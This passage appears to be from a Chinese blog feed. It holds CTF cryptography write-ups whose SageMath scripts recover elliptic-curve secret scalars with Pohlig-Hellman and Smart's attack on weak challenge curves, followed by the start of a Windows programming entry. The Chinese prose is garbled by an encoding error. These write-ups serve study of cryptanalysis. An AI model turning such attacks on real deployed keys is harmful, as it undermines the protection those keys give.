<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">E = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">K = (<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span> , <span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line">K = E(K)</span><br><span class="line">G = E((Gx,Gy))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">num2 = solve(G,K,E)</span><br><span class="line"><span class="built_in">print</span>(num2)</span><br></pre></td></tr></table></figure>
<p>è§£å‡ºæ¥ 11000838085296873931177<br>ä½†æ˜¯å‘ç°bitæ•°ä¸å¤Ÿ è¯´æ˜æ˜¯ä¸€ä¸ªç‰¹è§£ æˆ‘ä»¬æšä¸¾ä¸€ä¸‹æ±‚flag<br>æ±‚å¾—Pçš„é˜¶ååˆ©ç”¨é˜¶çš„æ€§è´¨æ¥æšä¸¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">E = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">K = (<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span> , <span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line">K = E(K)</span><br><span class="line">G = E((Gx,Gy))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    n = prod(primes)</span><br><span class="line">    <span class="keyword">return</span> m,n</span><br><span class="line"></span><br><span class="line">num2,n = solve(G,K,E)</span><br><span class="line">num2 = <span class="number">11000838085296873931177</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">2</span>^<span class="number">21</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    num = num2+k*n</span><br><span class="line">    <span class="keyword">if</span> num*G==K:</span><br><span class="line">        <span class="built_in">print</span>((<span class="built_in">int</span>(num)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 31685206468414518702878516593</span></span><br><span class="line"><span class="comment"># factor_ordeq</span></span><br></pre></td></tr></table></figure>

<h2 id="å¹¿ä¸œå¼ºç½‘æ¯2021å›¢é˜Ÿç»„-DLP"><a href="#å¹¿ä¸œå¼ºç½‘æ¯2021å›¢é˜Ÿç»„-DLP" class="headerlink" title="å¹¿ä¸œå¼ºç½‘æ¯2021å›¢é˜Ÿç»„ DLP"></a>å¹¿ä¸œå¼ºç½‘æ¯2021å›¢é˜Ÿç»„ DLP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>] == <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">d1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">d2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">N1 = <span class="number">27544759469094453505371358768052861416297003882211878831861112512567899543941</span></span><br><span class="line">A1 = <span class="number">4208715803791813173086894172778966025419787767340027559010619240548499823390</span></span><br><span class="line">B1 = <span class="number">11846440123913040489420209031751160809904311707943252241515965930654415480691</span></span><br><span class="line">P1x = <span class="number">479750084250968709343887919962436485997147832319843477221083468203689368148</span></span><br><span class="line">P1y = <span class="number">15452861783577624143044213767588871736433639621547613407582902947429567101675</span></span><br><span class="line"></span><br><span class="line">P1 = (P1x,P1y)</span><br><span class="line">E1 = EllipticCurve(Zmod(N1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">P1 = E1(P1)</span><br><span class="line">Q1 = d1 * P1</span><br><span class="line"></span><br><span class="line">N2 = <span class="number">6471339743593595797696002766822660599108196938080465998531085409467</span></span><br><span class="line">A2 = <span class="number">3199218821393204771660095172457569312269694438403110131957204042314</span></span><br><span class="line">B2 = <span class="number">762889472027318213897694878260359911054972690369935049954326689904</span></span><br><span class="line">P2x = <span class="number">2557373437970770011124755960432555084678930336188254243278984381842</span></span><br><span class="line">P2y = <span class="number">4442763096366920105760404533052204677305995021662082361185473321644</span></span><br><span class="line"></span><br><span class="line">P2 = (P2x,P2y)</span><br><span class="line">E2 = EllipticCurve(Zmod(N2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">P2 = E2(P2)</span><br><span class="line">Q2 = d2 * P2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Q1)</span><br><span class="line"><span class="built_in">print</span>(Q2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(14736970297054248276364510675718632926198693034158620007675880103924809577805 : 3447209262654420855289144268810543114387612255490962015335062266658385100211 : 1)</span></span><br><span class="line"><span class="string">(4834036103940457959470026215023033401071737087504569417466448644066 : 5511016821581393405975510064568222454318072088628361854656950557373 : 1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…ˆè´´ä»½exp æœ‰äº›åœ°æ–¹è¿˜æ²¡å¼„æ¸…æ¥š<br>å¤§è‡´æ„æ€æ˜¯ è¿™é‡Œçš„Néƒ½ä¸å¤§ æˆ‘ä»¬å¯ä»¥åˆ†è§£å‡ºæ¥ è½¬æ¢æˆ p,qçš„æ±‚è§£<br>ç„¶åå¯¹åº” pæ¯”è¾ƒå…‰æ»‘ å’Œ p&#x3D;&#x3D;E.order()çš„æƒ…å†µ åˆ†åˆ«ç”¨Pohlig-Hellman å’Œ SmartAttack<br>æœ‰ä¸ªè¦æ³¨æ„çš„ç‚¹æ˜¯ P1,Q1ä¸æ˜¯ç”Ÿæˆå…ƒ æ‰€ä»¥æœ€åCRTç»„åˆçš„æ—¶å€™è¦ç”¨ç‚¹çš„é˜¶è€Œä¸æ˜¯æ›²çº¿çš„é˜¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">N1 = </span><br><span class="line">A1 = </span><br><span class="line">B1 = </span><br><span class="line">P1x = </span><br><span class="line">P1y = </span><br><span class="line"></span><br><span class="line">Q1x = </span><br><span class="line">Q1y = </span><br><span class="line"></span><br><span class="line">p1 = </span><br><span class="line">q1 = </span><br><span class="line"></span><br><span class="line">P1 = (P1x, P1y)</span><br><span class="line">Q1 = (Q1x, Q1y)</span><br><span class="line">E1p = EllipticCurve(Zmod(p1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">n1p = E1p.order()</span><br><span class="line">P1p = E1p(P1)</span><br><span class="line">Q1p = E1p(Q1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n1p)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line">d1p = P1p.discrete_log(Q1p)</span><br><span class="line"></span><br><span class="line">E1q = EllipticCurve(Zmod(q1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">n1q = E1q.order()</span><br><span class="line">P1q = E1q(P1)</span><br><span class="line">Q1q = E1q(Q1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n1q)</span></span><br><span class="line"><span class="comment"># Smart</span></span><br><span class="line">d1q = SmartAttack(P1q, Q1q, q1)</span><br><span class="line"></span><br><span class="line">d1 = crt([d1p, d1q], [P1p.order(), P1q.order()])</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"></span><br><span class="line">N2 = </span><br><span class="line">A2 = </span><br><span class="line">B2 = </span><br><span class="line">P2x = </span><br><span class="line">P2y = </span><br><span class="line">Q2x = </span><br><span class="line">Q2y = </span><br><span class="line"></span><br><span class="line">p2 = <span class="number">69857405335111415530599248077</span></span><br><span class="line">q2 = <span class="number">92636417177965240871815246762704348071</span></span><br><span class="line"></span><br><span class="line">P2 = (P2x,P2y)</span><br><span class="line">Q2 = (Q2x,Q2y)</span><br><span class="line">E2p = EllipticCurve(Zmod(p2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">n2p = E2p.order()</span><br><span class="line">P2p = E2p(P2)</span><br><span class="line">Q2p = E2p(Q2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n2p)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line"><span class="comment"># d2p = P2p.discrete_log(Q2p)</span></span><br><span class="line"><span class="comment"># 64863796476861801236088764479</span></span><br><span class="line">d2p = <span class="number">64863796476861801236088764479</span></span><br><span class="line"></span><br><span class="line">E2q = EllipticCurve(Zmod(q2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">n2q = E2q.order()</span><br><span class="line">P2q = E2q(P2)</span><br><span class="line">Q2q = E2q(Q2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n2q)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line">d2q = P2q.discrete_log(Q2q)</span><br><span class="line"></span><br><span class="line">d2 = crt([d2p, d2q], [P2p.order(), P2q.order()])</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br></pre></td></tr></table></figure>

<h2 id="nctf2022-superecc"><a href="#nctf2022-superecc" class="headerlink" title="nctf2022 superecc"></a>nctf2022 superecc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> INF, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;nctf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">ecc = super_ecc()</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = ecc.mul(flag, G)</span><br><span class="line"><span class="built_in">print</span>(S)</span><br><span class="line"><span class="comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span></span><br><span class="line"><span class="comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ¶¨çŸ¥è¯†äº† orz<br>é¢˜ç›®ç»™çš„æ›²çº¿å½¢å¼æ˜¯ä¸€æ¡æ‰­æ›²çˆ±å¾·åæ›²çº¿ <a href="https://www.zhihu.com/question/290541183">https://www.zhihu.com/question/290541183</a><br>æœ¬é¢˜çš„å½¢å¼ä¸º <code>a*x^2+y^2=c^2(1+d*x^2*y^2)</code><br>å…¶å®æ¤­åœ†æ›²çº¿é™¤äº†weierstrasså½¢å¼å¸¸è§çš„è¿˜æœ‰å¦å¤–ä¸¤ç§: è’™å“¥é©¬åˆ©æ›²çº¿å’Œæ‰­æ›²çˆ±å¾·åæ›²çº¿<br>æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬æŒ‰ç…§æ–‡ç« çš„æ–¹æ³•å°†æ‰­æ›²çˆ±å¾·åæ›²çº¿-&gt;è’™å“¥é©¬åˆ©æ›²çº¿-&gt;ç»´å°”æ–¯ç‰¹æ‹‰æ–¯æ›²çº¿<br>æ³¨æ„è¦å…ˆå°†æ›²çº¿å˜ä¸º <code>a*v^2+w^2=1+d*v^2*w^2</code> çš„å½¢å¼</p>
<p><img src="https://s2.loli.net/2023/12/09/E9PyomncQWxMLre.png" alt="img"></p>
<p><img src="https://s2.loli.net/2023/12/09/sr59aSMuKceTk2b.png" alt="img"></p>
<p>ç›´æ¥æ¬å®˜æ–¹é¢˜è§£çš„äº† (å…¶å®å°±æ˜¯ç…§ç€å…¬å¼æ‰“å°±è¡Œäº†)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line">a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">P.&lt;z&gt; = PolynomialRing(Zmod(p))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½¢å¼&#x27;æ ‡å‡†&#x27;åŒ–</span></span><br><span class="line">aa = a</span><br><span class="line">dd = (d*c^<span class="number">4</span>)%p</span><br><span class="line">J = (<span class="number">2</span>*(aa+dd)*inverse_mod(aa-dd,p))%p</span><br><span class="line">K = (<span class="number">4</span>*inverse_mod(aa-dd,p))%p</span><br><span class="line">A = ((<span class="number">3</span>-J^<span class="number">2</span>)*inverse_mod(<span class="number">3</span>*K^<span class="number">2</span>,p))%p</span><br><span class="line">B = ((<span class="number">2</span>*J^<span class="number">3</span>-<span class="number">9</span>*J)*inverse_mod(<span class="number">27</span>*K^<span class="number">3</span>,p))%p</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™éƒ¨åˆ†æ˜¯ä¸ºäº† weier-&gt;twist</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  P(z^<span class="number">3</span>+A*z+B).roots():</span><br><span class="line">    alpha = <span class="built_in">int</span>(i[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(kronecker(<span class="number">3</span>*alpha^<span class="number">2</span>+A,p))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> P(z^<span class="number">2</span>-(<span class="number">3</span>*alpha^<span class="number">2</span>+A)).roots():</span><br><span class="line">        s = <span class="built_in">int</span>(j[<span class="number">0</span>])</span><br><span class="line">        s = inverse_mod(s, p)</span><br><span class="line">        <span class="keyword">if</span> J==alpha*<span class="number">3</span>*s%p:</span><br><span class="line">            Alpha = alpha</span><br><span class="line">            S = s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twist_to_weier</span>(<span class="params">x,y</span>): <span class="comment"># twist-&gt;mgml-&gt;weier</span></span><br><span class="line">    v = x*inverse_mod(c,p)%p</span><br><span class="line">    w = y*inverse_mod(c,p)%p</span><br><span class="line">    <span class="keyword">assert</span> (aa*v^<span class="number">2</span>+w^<span class="number">2</span>)%p==(<span class="number">1</span>+dd*v^<span class="number">2</span>*w^<span class="number">2</span>)%p</span><br><span class="line">    s = (<span class="number">1</span>+w)*inverse_mod(<span class="number">1</span>-w,p)%p <span class="comment"># s = (1+Ï‰)/(1-Ï‰)</span></span><br><span class="line">    t = s*inverse_mod(v,p)%p <span class="comment"># t = s/v</span></span><br><span class="line">    <span class="keyword">assert</span> (K*t^<span class="number">2</span>)%p==(s^<span class="number">3</span>+J*s^<span class="number">2</span>+s)%p</span><br><span class="line">    xW = (<span class="number">3</span>*s+J) * inverse_mod(<span class="number">3</span>*K, p) % p <span class="comment"># s = (3*K*x-J)/3</span></span><br><span class="line">    yW = t * inverse_mod(K, p) % p <span class="comment"># t = y/K</span></span><br><span class="line">    <span class="keyword">assert</span> yW^<span class="number">2</span> % p == (xW^<span class="number">3</span>+A*xW+B) % p</span><br><span class="line">    <span class="keyword">return</span> (xW,yW)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weier_to_twist</span>(<span class="params">x,y</span>):</span><br><span class="line">    xM=S*(x-Alpha)%p</span><br><span class="line">    yM=S*y%p</span><br><span class="line">    <span class="keyword">assert</span> (K*yM^<span class="number">2</span>)%p==(xM^<span class="number">3</span>+J*xM^<span class="number">2</span>+xM)%p</span><br><span class="line">    xe = xM*inverse_mod(yM,p)%p</span><br><span class="line">    ye = (xM-<span class="number">1</span>)*inverse_mod(xM+<span class="number">1</span>,p)%p</span><br><span class="line">    <span class="keyword">assert</span> (aa*xe^<span class="number">2</span>+ye^<span class="number">2</span>)%p==(<span class="number">1</span>+dd*xe^<span class="number">2</span>*ye^<span class="number">2</span>)%p</span><br><span class="line">    xq = xe*c%p</span><br><span class="line">    yq = ye*c%p</span><br><span class="line">    <span class="keyword">assert</span> (a*xq^<span class="number">2</span>+yq^<span class="number">2</span>)%p==c^<span class="number">2</span>*(<span class="number">1</span>+d*xq^<span class="number">2</span>*yq^<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> (xq,yq)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line">G = twist_to_weier(<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,<span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">Q = twist_to_weier(<span class="number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span>,<span class="number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span>)</span><br><span class="line">P = E(G)</span><br><span class="line">Q = E(Q)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±æ˜¯åœ¨ç†Ÿæ‚‰çš„ç»´å°”æ–¯ç‰¹æ‹‰æ–¯æ›²çº¿ä¸Šæ±‚ flag*G &#x3D; Q é—®é¢˜äº†<br>æ€»å…±å°±é‚£ä¹ˆå‡ ç§æ–¹æ³•(DLP,SmartAttack,CRT+PohligHellman)<br>å‘ç°Pçš„é˜¶èƒ½åˆ†è§£ æ‰€ä»¥ç›´æ¥Pohlig-Hellman å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(P.order()))</span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(primes)</span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">    dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">flag=crt(dlogs,primes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Tw1stzzzz</span></span><br></pre></td></tr></table></figure>
<hr>
<hr>
<p>å¤§è‡´åˆ—ä¸¾äº†ä¸€äº›é¢˜ç›®&#x2F;çŸ¥è¯†ç‚¹<br>ECCå¾ˆå¤šè¿›é˜¶åœ°æ–¹éƒ½éœ€è¦è¾ƒå¥½çš„ç¾¤è®ºåŸºç¡€ ç­‰å­¦çš„æ›´æ‰å®äº†å†å›æ¥çœ‹ å¸Œæœ›èƒ½æœ‰æ›´æ·±çš„ä½“ä¼š</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Windows-Programming-Exercise</title>
    <url>/2023/12/10/Windows-Programming-Exercise/</url>
    <content><![CDATA[<p>è®°å½•å­¦ä¹ Windowsç¼–ç¨‹çš„ä¸€äº›çŸ¥è¯†ç‚¹å’Œç»ƒä¹ ä»£ç </p>
<span id="more"></span>

<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="12-10"><a href="#12-10" class="headerlink" title="12.10"></a>12.10</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>æœ€ç®€å•çš„ä¸€ä¸ªAPI MessageBox</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span> </span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib,<span class="string">&quot;User32.lib&quot;</span>) <span class="comment">// æŒ‡æ˜å°†æºæ–‡ä»¶ç¼–è¯‘æˆ.objå å°†ç›®æ ‡æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨User32.lib</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;hInstance&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;hPrevInstance&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;lpCmdLine&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;nCmdShow&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    MessageBoxW(<span class="literal">NULL</span>,<span class="string">L&quot;Start to Learn Windows Programming!&quot;</span>,<span class="string">L&quot;Message Box&quot;</span>,MB_OKCANCEL);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯æ··åˆèµ·æ¥ç¼–å§ C++ç”¨æƒ¯äº†â€¦</p>
<p>å…³äºWinMainï¼š<br>WinMainå‡½æ•°æ˜¯ç¨‹åºå…¥å£ç‚¹ ç›¸å½“äºCä¸­çš„main<br>å››ä¸ªå‚æ•°:</p>
<ul>
<li>hInstance: åº”ç”¨ç¨‹åºæœ¬æ¬¡è¿è¡Œå®ä¾‹çš„å¥æŸ„ è¿™é‡Œæ‰“å°å‡ºæ¥æ˜¯ 0x400000</li>
<li>hPrevInstance: åº”ç”¨ç¨‹åºä¹‹å‰è¿è¡Œå®ä¾‹çš„å¥æŸ„ è¿™é‡Œæ‰“å°å‡ºæ¥æ˜¯ 0</li>
